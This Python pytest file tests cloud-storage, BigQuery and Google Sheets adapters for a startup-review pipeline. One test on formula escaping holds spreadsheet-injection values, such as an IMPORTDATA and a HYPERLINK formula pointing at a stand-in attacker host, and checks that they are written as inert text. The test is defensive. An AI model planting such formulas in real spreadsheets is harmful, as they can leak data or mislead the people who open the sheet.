import logging

import pytest
from google.api_core.exceptions import PreconditionFailed

from merry_runtime.adapters.bigquery import BigQueryStructuredStore, build_query_job_config
from merry_runtime.adapters.gcs import GCSObjectStore
from merry_runtime.adapters.gmail import GmailLabelSource
from merry_runtime.adapters.google_sheets import GoogleSheetReviewQueue, OPERATOR_CONSOLE_HEADERS
from merry_runtime.adapters.slack import SlackNotifier


class FakeBlob:
    def __init__(self) -> None:
        self.uploaded: dict[str, object] = {}

    def upload_from_string(self, text: str, *, content_type: str, if_generation_match: int | None = None) -> None:
        self.uploaded = {
            "text": text,
            "content_type": content_type,
            "if_generation_match": if_generation_match,
        }


class FakeBucket:
    def __init__(self) -> None:
        self.blobs: dict[str, FakeBlob] = {}

    def blob(self, path: str) -> FakeBlob:
        self.blobs[path] = FakeBlob()
        return self.blobs[path]


class FakeGCSClient:
    def __init__(self) -> None:
        self.bucket_obj = FakeBucket()

    def bucket(self, name: str) -> FakeBucket:
        self.bucket_name = name
        return self.bucket_obj


class FakeExistingBlob(FakeBlob):
    def upload_from_string(self, text: str, *, content_type: str, if_generation_match: int | None = None) -> None:
        self.uploaded = {
            "text": text,
            "content_type": content_type,
            "if_generation_match": if_generation_match,
        }
        raise PreconditionFailed("object already exists")


class FakeExistingBucket(FakeBucket):
    def blob(self, path: str) -> FakeBlob:
        self.blobs[path] = FakeExistingBlob()
        return self.blobs[path]


class FakeExistingGCSClient(FakeGCSClient):
    def __init__(self) -> None:
        self.bucket_obj = FakeExistingBucket()


def test_gcs_object_store_uploads_text_and_returns_gs_uri() -> None:
    client = FakeGCSClient()
    store = GCSObjectStore(client=client, bucket="raw-bucket")

    uri = store.write_raw_text(path="/raw/a.txt", text="hello", content_type="text/plain")

    assert uri == "gs://raw-bucket/raw/a.txt"
    assert client.bucket_name == "raw-bucket"
    assert client.bucket_obj.blobs["raw/a.txt"].uploaded == {
        "text": "hello",
        "content_type": "text/plain",
        "if_generation_match": 0,
    }


def test_gcs_object_store_returns_existing_uri_when_raw_object_already_exists() -> None:
    client = FakeExistingGCSClient()
    store = GCSObjectStore(client=client, bucket="raw-bucket")

    uri = store.write_raw_text(path="/raw/a.txt", text="hello", content_type="text/plain")

    assert uri == "gs://raw-bucket/raw/a.txt"
    assert client.bucket_obj.blobs["raw/a.txt"].uploaded == {
        "text": "hello",
        "content_type": "text/plain",
        "if_generation_match": 0,
    }


class FakeQueryJob:
    def __init__(self, rows: list[dict[str, object]] | None = None, error: Exception | None = None) -> None:
        self.rows = rows or []
        self.error = error

    def result(self) -> list[dict[str, object]]:
        if self.error:
            raise self.error
        return self.rows


class FakeBigQueryClient:
    def __init__(self) -> None:
        self.queries: list[tuple[str, dict[str, object]]] = []
        self.inserted: list[tuple[str, list[dict[str, object]]]] = []
        self.loaded_rows: list[tuple[str, list[dict[str, object]], object | None]] = []
        self.deleted_tables: list[str] = []

    def query(self, sql: str, job_config: object | None = None) -> FakeQueryJob:
        metadata = dict(getattr(job_config, "parameters", {}))
        metadata["default_dataset"] = getattr(job_config, "default_dataset", None)
        self.queries.append((sql, metadata))
        return FakeQueryJob([{"entity_id": "ent_1", "name": "Merry AI"}])

    def insert_rows_json(self, table_id: str, rows: list[dict[str, object]]) -> list[object]:
        self.inserted.append((table_id, rows))
        return []

    def load_table_from_json(
        self, rows: list[dict[str, object]], table_id: str, job_config: object | None = None
    ) -> FakeQueryJob:
        self.loaded_rows.append((table_id, rows, job_config))
        return FakeQueryJob()

    def delete_table(self, table_id: str, *, not_found_ok: bool = False) -> None:
        self.deleted_tables.append(table_id)


class FakeFailingCleanupBigQueryClient(FakeBigQueryClient):
    def __init__(self, *, load_error: Exception | None = None, merge_error: Exception | None = None) -> None:
        super().__init__()
        self.load_error = load_error
        self.merge_error = merge_error

    def query(self, sql: str, job_config: object | None = None) -> FakeQueryJob:
        super().query(sql, job_config=job_config)
        return FakeQueryJob(error=self.merge_error)

    def load_table_from_json(
        self, rows: list[dict[str, object]], table_id: str, job_config: object | None = None
    ) -> FakeQueryJob:
        super().load_table_from_json(rows, table_id, job_config=job_config)
        return FakeQueryJob(error=self.load_error)

    def delete_table(self, table_id: str, *, not_found_ok: bool = False) -> None:
        super().delete_table(table_id, not_found_ok=not_found_ok)
        raise RuntimeError("cleanup failed")


def test_bigquery_structured_store_returns_zero_for_empty_upsert_without_client_calls() -> None:
    client = FakeBigQueryClient()
    store = BigQueryStructuredStore(client=client, project_id="p", dataset_id="d")

    count = store.upsert_rows(table="mother_entities", rows=[], key_fields=("entity_id",))

    assert count == 0
    assert client.queries == []
    assert client.inserted == []
    assert client.loaded_rows == []
    assert client.deleted_tables == []


def test_bigquery_upsert_loads_staging_table_and_merges_without_target_delete() -> None:
    client = FakeBigQueryClient()
    store = BigQueryStructuredStore(client=client, project_id="p", dataset_id="d")

    count = store.upsert_rows(
        table="mother_entities",
        rows=[
            {
                "entity_id": "ent_1",
                "entity_type": "startup",
                "name": "Merry AI",
                "normalized_name": "merryai",
                "first_seen_at": "2026-05-18T00:00:00+00:00",
                "last_seen_at": "2026-05-18T00:00:00+00:00",
            }
        ],
        key_fields=("entity_id",),
    )

    assert count == 1
    assert client.loaded_rows[0][0].startswith("p.d._staging_mother_entities_")
    assert "MERGE `p.d.mother_entities`" in client.queries[-1][0]
    assert "`entity_id`, `entity_type`, `name`, `normalized_name`, `region`" in client.queries[-1][0]
    assert "DELETE FROM `p.d.mother_entities`" not in " ".join(sql for sql, _metadata in client.queries)
    assert client.deleted_tables[0].startswith("p.d._staging_mother_entities_")


def test_bigquery_append_mode_loads_directly_without_dml() -> None:
    client = FakeBigQueryClient()
    store = BigQueryStructuredStore(client=client, project_id="p", dataset_id="d", write_mode="append")

    count = store.upsert_rows(
        table="mother_entities",
        rows=[
            {
                "entity_id": "ent_1",
                "entity_type": "startup",
                "name": "Runpod Canary",
                "normalized_name": "runpod canary",
                "region": "Seoul",
                "industry": "AI",
                "homepage": "https://runpod.example",
                "representative": "Canary",
                "first_seen_at": "2026-05-18T00:00:00+00:00",
                "last_seen_at": "2026-05-18T00:00:00+00:00",
            }
        ],
        key_fields=("entity_id",),
    )

    assert count == 1
    assert client.loaded_rows[0][0] == "p.d.mother_entities"
    assert client.loaded_rows[0][2].write_disposition == "WRITE_APPEND"
    assert client.queries == []


def test_bigquery_upsert_rejects_duplicate_batch_keys_before_bigquery_calls() -> None:
    client = FakeBigQueryClient()
    store = BigQueryStructuredStore(client=client, project_id="p", dataset_id="d")

    with pytest.raises(ValueError, match="duplicate key_fields value"):
        store.upsert_rows(
            table="mother_entities",
            rows=[
                {"entity_id": "ent_1", "name": "Merry AI"},
                {"entity_id": "ent_1", "name": "Merry AI Duplicate"},
            ],
            key_fields=("entity_id",),
        )

    assert client.loaded_rows == []
    assert client.queries == []
    assert client.deleted_tables == []


def test_bigquery_upsert_preserves_load_error_when_staging_cleanup_fails() -> None:
    load_error = RuntimeError("load failed")
    client = FakeFailingCleanupBigQueryClient(load_error=load_error)
    store = BigQueryStructuredStore(client=client, project_id="p", dataset_id="d")

    with pytest.raises(RuntimeError, match="load failed"):
        store.upsert_rows(
            table="mother_entities",
            rows=[{"entity_id": "ent_1", "name": "Merry AI"}],
            key_fields=("entity_id",),
        )

    assert len(client.loaded_rows) == 1
    assert client.queries == []
    assert len(client.deleted_tables) == 1


def test_bigquery_upsert_preserves_merge_error_when_staging_cleanup_fails() -> None:
    merge_error = RuntimeError("merge failed")
    client = FakeFailingCleanupBigQueryClient(merge_error=merge_error)
    store = BigQueryStructuredStore(client=client, project_id="p", dataset_id="d")

    with pytest.raises(RuntimeError, match="merge failed"):
        store.upsert_rows(
            table="mother_entities",
            rows=[{"entity_id": "ent_1", "name": "Merry AI"}],
            key_fields=("entity_id",),
        )

    assert len(client.loaded_rows) == 1
    assert "MERGE `p.d.mother_entities`" in client.queries[-1][0]
    assert len(client.deleted_tables) == 1


def test_bigquery_upsert_does_not_fail_successful_merge_when_staging_cleanup_fails(caplog: pytest.LogCaptureFixture) -> None:
    client = FakeFailingCleanupBigQueryClient()
    store = BigQueryStructuredStore(client=client, project_id="p", dataset_id="d")

    caplog.set_level(logging.WARNING, logger="merry_runtime.adapters.bigquery")
    count = store.upsert_rows(
        table="mother_entities",
        rows=[{"entity_id": "ent_1", "name": "Merry AI"}],
        key_fields=("entity_id",),
    )

    assert count == 1
    assert len(client.loaded_rows) == 1
    assert "MERGE `p.d.mother_entities`" in client.queries[-1][0]
    assert len(client.deleted_tables) == 1
    assert "failed to delete BigQuery staging table" in caplog.text
    assert client.deleted_tables[0] in caplog.text
    assert "cleanup failed" in caplog.text


def test_bigquery_structured_store_query_rows_returns_dicts() -> None:
    client = FakeBigQueryClient()
    store = BigQueryStructuredStore(client=client, project_id="p", dataset_id="d")

    rows = store.query_rows(sql="select * from mother_entities", parameters={"entity_id": "ent_1"})

    assert rows == [{"entity_id": "ent_1", "name": "Merry AI"}]
    default_dataset = client.queries[0][1]["default_dataset"]
    if hasattr(default_dataset, "project") and hasattr(default_dataset, "dataset_id"):
        assert default_dataset.project == "p"
        assert default_dataset.dataset_id == "d"
    else:
        assert str(default_dataset) == "p.d"


class FakeScalarQueryParameter:
    def __init__(self, name: str, parameter_type: str, value: object) -> None:
        self.name = name
        self.parameter_type = parameter_type
        self.value = value


class FakeQueryJobConfig:
    def __init__(self, *, query_parameters: list[FakeScalarQueryParameter], default_dataset: str | None = None) -> None:
        self.query_parameters = query_parameters
        self.default_dataset = default_dataset


class FakeBigQueryModule:
    ScalarQueryParameter = FakeScalarQueryParameter
    QueryJobConfig = FakeQueryJobConfig


def test_bigquery_job_config_uses_google_query_parameters_when_module_is_available() -> None:
    config = build_query_job_config({"entity_id": "ent_1", "confidence": 0.9}, bigquery_module=FakeBigQueryModule)

    assert [(param.name, param.parameter_type, param.value) for param in config.query_parameters] == [
        ("entity_id", "STRING", "ent_1"),
        ("confidence", "FLOAT64", 0.9),
    ]


class FakeValues:
    def __init__(self) -> None:
        self.append_body: dict[str, object] | None = None
        self.get_responses: list[dict[str, object]] = []
        self.calls: list[tuple[str, dict[str, object]]] = []

    def append(self, **kwargs: object) -> "FakeValues":
        self.calls.append(("append", kwargs))
        self.append_kwargs = kwargs
        self.append_body = kwargs["body"]  # type: ignore[index]
        self._pending_execute = "append"
        return self

    def get(self, **kwargs: object) -> "FakeValues":
        self.calls.append(("get", kwargs))
        self.get_kwargs = kwargs
        self._pending_execute = "get"
        return self

    def update(self, **kwargs: object) -> "FakeValues":
        self.calls.append(("update", kwargs))
        self.update_kwargs = kwargs
        self.update_body = kwargs["body"]  # type: ignore[index]
        self._pending_execute = "update"
        return self

    def clear(self, **kwargs: object) -> "FakeValues":
        self.calls.append(("clear", kwargs))
        self.clear_kwargs = kwargs
        self.clear_body = kwargs["body"]  # type: ignore[index]
        self._pending_execute = "clear"
        return self

    def execute(self) -> dict[str, object]:
        pending = getattr(self, "_pending_execute", "")
        self._pending_execute = ""
        if pending == "get":
            if self.get_responses:
                return self.get_responses.pop(0)
            return {
                "values": [
                    [
                        "card_id",
                        "entity_id",
                        "company",
                        "region",
                        "industry",
                        "total_score",
                        "recommended_action",
                        "queue_type",
                        "priority_probability",
                        "rationale",
                        "decision",
                        "review_memo",
                        "reviewer",
                    ],
                    [
                        "card_1",
                        "ent_1",
                        "Merry AI",
                        "Jeonbuk",
                        "Agri",
                        "88.0",
                        "advance",
                        "priority",
                        "0.77",
                        "strong fit",
                        "advance",
                        "met founder",
                        "boram",
                    ],
                ]
            }
        return {"updates": {"updatedRows": 1}}


class FakeSheetsService:
    def __init__(self) -> None:
        self.values_obj = FakeValues()
        self.sheet_titles: set[str] = set()

    def spreadsheets(self) -> "FakeSheetsService":
        return self

    def values(self) -> FakeValues:
        return self.values_obj

    def get(self, **kwargs: object) -> "FakeSheetsService":
        self.get_kwargs = kwargs
        self._pending_execute = "get"
        return self

    def batchUpdate(self, **kwargs: object) -> "FakeSheetsService":
        self.batch_update_kwargs = kwargs
        self.batch_update_body = kwargs["body"]  # type: ignore[index]
        self._pending_execute = "batchUpdate"
        return self

    def execute(self) -> dict[str, object]:
        if getattr(self, "_pending_execute", "") == "batchUpdate":
            for request in self.batch_update_body["requests"]:  # type: ignore[index]
                title = request["addSheet"]["properties"]["title"]
                self.sheet_titles.add(title)
            return {"replies": [{}]}
        return {"sheets": [{"properties": {"title": title}} for title in sorted(self.sheet_titles)]}


def test_google_sheet_review_queue_publishes_rows_and_reads_reviews() -> None:
    service = FakeSheetsService()
    service.values_obj.get_responses.append({"values": []})
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    published = queue.publish_cards(
        sheet_tab="ac_climate",
        rows=[
            {
                "card_id": "card_1",
                "entity_id": "ent_1",
                "company": "Merry AI",
                "region": "Jeonbuk",
                "industry": "Agri",
                "total_score": 88.0,
                "recommended_action": "advance",
                "queue_type": "priority",
                "priority_probability": 0.77,
                "rationale": "strong fit",
                "decision": "",
                "review_memo": "",
                "reviewer": "",
            }
        ],
    )
    reviews = queue.read_pending_reviews(sheet_tab="ac_climate")

    assert published == 1
    assert service.values_obj.update_kwargs["range"] == "ac_climate!A1:N1"
    assert service.values_obj.append_kwargs["range"] == "ac_climate!A:N"
    assert service.values_obj.append_body == {
        "values": [
            [
                "card_1",
                "ent_1",
                "Merry AI",
                "Jeonbuk",
                "Agri",
                88.0,
                "advance",
                "priority",
                0.77,
                "strong fit",
                "",
                "",
                "",
                "",
            ]
        ]
    }
    assert reviews == [
        {
            "card_id": "card_1",
            "entity_id": "ent_1",
            "company": "Merry AI",
            "region": "Jeonbuk",
            "industry": "Agri",
            "total_score": "88.0",
            "recommended_action": "advance",
            "queue_type": "priority",
            "priority_probability": "0.77",
            "rationale": "strong fit",
            "decision": "advance",
            "review_memo": "met founder",
            "reviewer": "boram",
        }
    ]


def test_google_sheet_review_queue_appends_new_columns_to_existing_headers_without_reordering() -> None:
    service = FakeSheetsService()
    legacy_headers = [
        "card_id",
        "entity_id",
        "company",
        "region",
        "industry",
        "total_score",
        "recommended_action",
        "queue_type",
        "priority_probability",
        "rationale",
        "decision",
        "review_memo",
        "reviewer",
    ]
    service.values_obj.get_responses.append({"values": [legacy_headers]})
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    queue.publish_cards(
        sheet_tab="ac_climate",
        rows=[
            {
                "card_id": "card_1",
                "entity_id": "ent_1",
                "company": "Merry AI",
                "contact_email": "hello@merry.ai",
            }
        ],
    )

    assert service.values_obj.update_body == {"values": [legacy_headers + ["contact_email"]]}
    assert service.values_obj.append_kwargs["range"] == "ac_climate!A:N"
    assert service.values_obj.append_body["values"][0][-1] == "hello@merry.ai"  # type: ignore[index]


def test_google_sheet_review_queue_creates_missing_tab_before_headers() -> None:
    service = FakeSheetsService()
    service.values_obj.get_responses.append({"values": []})
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    queue.publish_cards(sheet_tab="Evidence", rows=[{"source_id": "src_1"}])

    assert service.batch_update_body == {"requests": [{"addSheet": {"properties": {"title": "Evidence"}}}]}
    assert "Evidence" in service.sheet_titles
    assert service.values_obj.update_kwargs["range"] == "Evidence!A1:M1"


def test_google_sheet_review_queue_uses_raw_values_and_escapes_formula_cells() -> None:
    service = FakeSheetsService()
    service.values_obj.get_responses.append({"values": []})
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    queue.publish_cards(
        sheet_tab="ac_climate",
        rows=[
            {
                "card_id": "card_1",
                "entity_id": "ent_1",
                "company": "=IMPORTDATA(\"https://evil.example\")",
                "region": "+SUM(1,1)",
                "industry": "-10",
                "total_score": 88.0,
                "recommended_action": "@hidden",
                "queue_type": "priority",
                "priority_probability": 0.77,
                "rationale": "\t=HYPERLINK(\"https://evil.example\")",
                "decision": "",
                "review_memo": "\r=1+1",
                "reviewer": "",
            }
        ],
    )

    assert service.values_obj.append_kwargs["valueInputOption"] == "RAW"
    values = service.values_obj.append_body["values"][0]  # type: ignore[index]
    assert values[2] == "'=IMPORTDATA(\"https://evil.example\")"
    assert values[3] == "'+SUM(1,1)"
    assert values[4] == "'-10"
    assert values[6] == "'@hidden"
    assert values[9] == "'\t=HYPERLINK(\"https://evil.example\")"
    assert values[11] == "'\r=1+1"


def test_google_sheet_review_queue_publishes_entity_resolution_schema() -> None:
    service = FakeSheetsService()
    service.values_obj.get_responses.append({"values": []})
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    published = queue.publish_cards(
        sheet_tab="entity_resolution",
        rows=[
            {
                "event_id": "er_1",
                "candidate_entity_id": "ent_candidate",
                "matched_entity_id": "ent_existing",
                "action": "merge_candidate",
                "probability": 0.92,
                "status": "pending_review",
                "rationale": "domain_match=1.00",
            }
        ],
    )

    assert published == 1
    assert service.values_obj.update_kwargs["range"] == "entity_resolution!A1:J1"
    assert service.values_obj.update_body == {
        "values": [
            [
                "event_id",
                "candidate_entity_id",
                "matched_entity_id",
                "action",
                "probability",
                "status",
                "rationale",
                "decision",
                "review_memo",
                "reviewer",
            ]
        ]
    }
    assert service.values_obj.append_kwargs["range"] == "entity_resolution!A:J"
    assert service.values_obj.append_kwargs["valueInputOption"] == "RAW"
    assert service.values_obj.append_body == {
        "values": [
            [
                "er_1",
                "ent_candidate",
                "ent_existing",
                "merge_candidate",
                0.92,
                "pending_review",
                "domain_match=1.00",
                "",
                "",
                "",
            ]
        ]
    }


def test_google_sheet_review_queue_upserts_existing_row_by_key() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("Candidate Detail")
    headers = list(OPERATOR_CONSOLE_HEADERS["Candidate Detail"])
    existing_row = [
        "2026-05-18T00:00:00+00:00",
        "Merry AI",
        "merryai",
        "Old Founder",
        "",
        "master@thevc.kr",
        "Seoul",
        "AI",
        "공개 카드 -> Merry AI",
        "old model",
        "Seed",
        "undisclosed",
        "Old Investor",
        "",
        "",
        "new_source",
        "score_candidates",
        "crawled",
        "wiki/entities/Merry AI.md",
    ]
    service.values_obj.get_responses.extend(
        [
            {"values": [headers]},
            {"values": [headers, existing_row]},
        ]
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    count = queue.upsert_cards(
        sheet_tab="Candidate Detail",
        rows=[
            {
                "entity_id": "ent_1",
                "collected_at": "2026-05-19T00:00:00+00:00",
                "company": "Merry AI",
                "normalized_name": "merryai",
                "representative": "New Founder",
                "business_model": "AI workflow automation",
                "investment_round": "Seed",
                "investment_amount": "1B KRW",
                "investor": "Merry Ventures",
                "region": "Seoul",
                "industry": "AI",
                "summary": "공개 카드 -> Merry AI",
                "queue_type": "new_source",
                "recommended_action": "score_candidates",
                "status": "crawled",
                "wiki_path": "wiki/entities/Merry AI.md",
                "contact_email": "founder@merry.ai",
            }
        ],
        key_fields=("company",),
    )

    assert count == 1
    assert service.values_obj.append_body is None
    assert service.values_obj.update_kwargs["range"] == "'Candidate Detail'!A2:AF2"
    assert service.values_obj.update_body["values"][0][3] == "New Founder"  # type: ignore[index]
    assert service.values_obj.update_body["values"][0][5] == "founder@merry.ai"  # type: ignore[index]
    assert service.values_obj.update_body["values"][0][8] == "공개 카드 -> Merry AI"  # type: ignore[index]
    assert service.values_obj.update_body["values"][0][9] == "AI workflow automation"  # type: ignore[index]


def test_google_sheet_review_queue_migrates_candidate_detail_from_entity_id_schema() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("Candidate Detail")
    old_headers = [
        "entity_id",
        "company",
        "normalized_name",
        "representative",
        "homepage",
        "region",
        "industry",
        "summary",
        "latest_score",
        "priority_probability",
        "queue_type",
        "recommended_action",
        "status",
        "wiki_path",
        "contact_email",
    ]
    old_row = [
        "ent_1",
        "Merry AI",
        "merryai",
        "Old Founder",
        "",
        "Seoul",
        "AI",
        "공개 카드 -> Merry AI",
        "91.0",
        "0.92",
        "priority",
        "advance",
        "qualified",
        "wiki/entities/Merry AI.md",
        "hello@merry.ai",
    ]
    service.values_obj.get_responses.extend(
        [
            {"values": [old_headers]},
            {"values": [old_headers, old_row]},
        ]
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    count = queue.upsert_cards(
        sheet_tab="Candidate Detail",
        rows=[
            {
                "collected_at": "2026-05-19T00:00:00+00:00",
                "company": "Merry AI",
                "normalized_name": "merryai",
                "representative": "New Founder",
                "homepage": "https://merry.ai",
                "contact_email": "founder@merry.ai",
                "region": "Seoul",
                "industry": "AI",
                "summary": "공개 카드 -> Merry AI",
                "business_model": "AI workflow automation",
                "investment_round": "Seed",
                "investment_amount": "1B KRW",
                "investor": "Merry Ventures",
                "queue_type": "new_source",
                "recommended_action": "score_candidates",
                "status": "crawled",
                "wiki_path": "wiki/entities/Merry AI.md",
            }
        ],
        key_fields=("company", "homepage"),
    )

    assert count == 1
    rewritten = service.values_obj.update_body["values"]  # type: ignore[index]
    assert service.values_obj.update_kwargs["range"] == "'Candidate Detail'!A1:AF2"
    assert rewritten[0][0] == "collected_at"
    assert "entity_id" not in rewritten[0]
    assert rewritten[1][0] == "2026-05-19T00:00:00+00:00"
    assert rewritten[1][1] == "Merry AI"
    assert rewritten[1][3] == "New Founder"
    assert rewritten[1][4] == "https://merry.ai"
    assert rewritten[1][5] == "founder@merry.ai"
    assert rewritten[1][8] == "공개 카드 -> Merry AI"
    assert rewritten[1][9] == "AI workflow automation"


def test_google_sheet_review_queue_rewrites_legacy_candidate_detail_projection_rows() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("Candidate Detail")
    headers = list(OPERATOR_CONSOLE_HEADERS["Candidate Detail"])
    legacy_row = [
        "",
        "Old Co",
        "oldco",
        "Old Founder",
        "https://old.example",
        "hello@old.example",
        "Seoul",
        "AI",
        "THE VC 투자/M&A 공개 카드: Old Co / Old Product.",
        "",
        "",
        "",
        "",
        "",
        "",
        "new_source",
        "score_candidates",
        "crawled",
        "wiki/entities/Old Co.md",
    ]
    stale_row = [
        "2026-05-18T00:00:00+00:00",
        "Stale Co",
        "staleco",
        "Stale Founder",
        "https://stale.example",
        "hello@stale.example",
        "Seoul",
        "AI",
        "공개 카드 -> Merry AI",
        "",
        "",
        "",
        "",
        "",
        "",
        "new_source",
        "score_candidates",
        "crawled",
        "wiki/entities/Stale Co.md",
    ]
    service.values_obj.get_responses.extend(
        [
            {"values": [headers]},
            {"values": [headers, legacy_row, stale_row]},
        ]
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    count = queue.upsert_cards(
        sheet_tab="Candidate Detail",
        rows=[
            {
                "collected_at": "2026-05-19T00:00:00+00:00",
                "company": "Merry AI",
                "normalized_name": "merryai",
                "representative": "Founder",
                "homepage": "https://merry.ai",
                "contact_email": "founder@merry.ai",
                "region": "Seoul",
                "industry": "AI",
                "summary": "공개 카드 -> Merry AI",
                "business_model": "AI workflow automation",
                "investment_round": "Seed",
                "investment_amount": "1B KRW",
                "investor": "Merry Ventures",
                "queue_type": "new_source",
                "recommended_action": "score_candidates",
                "status": "crawled",
                "wiki_path": "wiki/entities/Merry AI.md",
            }
        ],
        key_fields=("company", "homepage"),
    )

    assert count == 1
    rewritten = service.values_obj.update_body["values"]  # type: ignore[index]
    assert service.values_obj.update_kwargs["range"] == "'Candidate Detail'!A1:AF2"
    assert service.values_obj.clear_kwargs["range"] == "'Candidate Detail'!A3:AF3"
    assert len(rewritten) == 2
    assert rewritten[1][1] == "Merry AI"
    assert rewritten[1][8] == "공개 카드 -> Merry AI"


def test_google_sheet_review_queue_upsert_dedupes_new_rows_with_same_key_in_batch() -> None:
    service = FakeSheetsService()
    service.values_obj.get_responses.extend(
        [
            {"values": []},
            {"values": [list(OPERATOR_CONSOLE_HEADERS["Candidate Detail"])]},
        ]
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    queue.upsert_cards(
        sheet_tab="Candidate Detail",
        rows=[
            {
                "collected_at": "2026-05-18T00:00:00+00:00",
                "company": "Merry AI",
                "homepage": "https://merry.ai",
                "representative": "Old Founder",
                "status": "crawled",
            },
            {
                "collected_at": "2026-05-19T00:00:00+00:00",
                "company": "Merry AI",
                "homepage": "https://merry.ai",
                "representative": "New Founder",
                "status": "crawled",
            },
        ],
        key_fields=("company",),
    )

    assert service.values_obj.append_body is not None
    values = service.values_obj.append_body["values"]  # type: ignore[index]
    assert len(values) == 1
    assert values[0][3] == "New Founder"


def test_google_sheet_review_queue_upsert_preserves_sheet_owned_and_custom_cells() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("Candidate Detail")
    headers = [*OPERATOR_CONSOLE_HEADERS["Candidate Detail"], "operator_note"]
    existing_row = [
        "2026-05-18T00:00:00+00:00",
        "Merry AI",
        "merryai",
        "Old Founder",
        "https://merry.ai",
        "hello@merry.ai",
        "Seoul",
        "AI",
        "공개 카드 -> Merry AI",
        "old model",
        "Seed",
        "undisclosed",
        "Old Investor",
        "91.0",
        "0.92",
        "priority",
        "advance",
        "qualified",
        "wiki/entities/Merry AI.md",
        "call Tuesday",
    ]
    service.values_obj.get_responses.extend(
        [
            {"values": [headers]},
            {"values": [headers, existing_row]},
        ]
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    queue.upsert_cards(
        sheet_tab="Candidate Detail",
        rows=[
            {
                "collected_at": "2026-05-19T00:00:00+00:00",
                "company": "Merry AI",
                "normalized_name": "merryai",
                "representative": "New Founder",
                "homepage": "",
                "contact_email": "",
                "region": "Seoul",
                "industry": "AI",
                "summary": "new summary",
                "business_model": "new model",
                "investment_round": "Series A",
                "investment_amount": "2B KRW",
                "investor": "New Investor",
                "latest_score": "",
                "priority_probability": "",
                "queue_type": "new_source",
                "recommended_action": "score_candidates",
                "status": "crawled",
                "wiki_path": "wiki/entities/Merry AI.md",
            }
        ],
        key_fields=("company",),
    )

    updated = service.values_obj.update_body["values"][0]  # type: ignore[index]
    assert updated[3] == "New Founder"
    assert updated[4] == "https://merry.ai"
    assert updated[5] == "hello@merry.ai"
    assert updated[13] == "91.0"
    assert updated[14] == "0.92"
    assert updated[17] == "qualified"
    assert updated[19] == "call Tuesday"


def test_google_sheet_review_queue_upsert_clears_known_bad_crawl_cells() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("Candidate Detail")
    headers = list(OPERATOR_CONSOLE_HEADERS["Candidate Detail"])
    existing_row = [
        "2026-05-18T00:00:00+00:00",
        "Merry AI",
        "merryai",
        "Old Founder",
        "https://주식회사",
        "master@thevc.kr",
        "Seoul",
        "AI",
        "공개 카드 -> Merry AI",
        "old model",
        "Seed",
        "undisclosed",
        "Old Investor",
        "",
        "",
        "new_source",
        "score_candidates",
        "crawled",
        "wiki/entities/Merry AI.md",
    ]
    service.values_obj.get_responses.extend(
        [
            {"values": [headers]},
            {"values": [headers, existing_row]},
        ]
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    queue.upsert_cards(
        sheet_tab="Candidate Detail",
        rows=[
            {
                "collected_at": "2026-05-19T00:00:00+00:00",
                "company": "Merry AI",
                "normalized_name": "merryai",
                "representative": "New Founder",
                "homepage": "",
                "contact_email": "",
                "region": "Seoul",
                "industry": "AI",
                "summary": "new summary",
                "business_model": "new model",
                "investment_round": "Series A",
                "investment_amount": "2B KRW",
                "investor": "New Investor",
                "queue_type": "new_source",
                "recommended_action": "score_candidates",
                "status": "crawled",
                "wiki_path": "wiki/entities/Merry AI.md",
            }
        ],
        key_fields=("company",),
    )

    updated = service.values_obj.update_body["values"][0]  # type: ignore[index]
    assert updated[4] == ""
    assert updated[5] == ""


def test_google_sheet_review_queue_compacts_candidate_detail_by_company_or_homepage() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("Candidate Detail")
    headers = list(OPERATOR_CONSOLE_HEADERS["Candidate Detail"])
    service.values_obj.get_responses.extend(
        [
            {"values": [headers]},
            {
                "values": [
                    headers,
                    [
                        "2026-05-18T00:00:00+00:00",
                        "Merry AI",
                        "merryai",
                        "Founder",
                        "",
                        "",
                        "Seoul",
                        "AI",
                        "summary",
                        "model",
                        "Seed",
                        "undisclosed",
                        "Investor",
                        "",
                        "",
                        "new_source",
                        "score_candidates",
                        "crawled",
                        "wiki/entities/Merry AI.md",
                    ],
                    [
                        "2026-05-18T00:01:00+00:00",
                        "Merry AI",
                        "merryai",
                        "Founder",
                        "https://주식회사",
                        "master@thevc.kr",
                        "Seoul",
                        "AI",
                        "summary",
                        "model",
                        "Seed",
                        "undisclosed",
                        "Investor",
                        "",
                        "",
                        "new_source",
                        "score_candidates",
                        "crawled",
                        "wiki/entities/Merry AI.md",
                    ],
                    [
                        "2026-05-18T00:02:00+00:00",
                        "Merry AI",
                        "merryai",
                        "Founder",
                        "",
                        "master@thevc.kr",
                        "Seoul",
                        "AI",
                        "summary",
                        "model",
                        "Seed",
                        "undisclosed",
                        "Investor",
                        "",
                        "",
                        "new_source",
                        "score_candidates",
                        "crawled",
                        "wiki/entities/Merry AI.md",
                    ],
                ]
            },
        ]
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    count = queue.upsert_cards(
        sheet_tab="Candidate Detail",
        rows=[
            {
                "collected_at": "2026-05-19T00:00:00+00:00",
                "company": "Merry AI",
                "normalized_name": "merryai",
                "representative": "Founder",
                "homepage": "",
                "contact_email": "",
                "region": "Seoul",
                "industry": "AI",
                "summary": "summary",
                "business_model": "model",
                "investment_round": "Seed",
                "investment_amount": "undisclosed",
                "investor": "Investor",
                "queue_type": "new_source",
                "recommended_action": "score_candidates",
                "status": "crawled",
                "wiki_path": "wiki/entities/Merry AI.md",
            }
        ],
        key_fields=("company", "homepage"),
    )

    assert count == 1
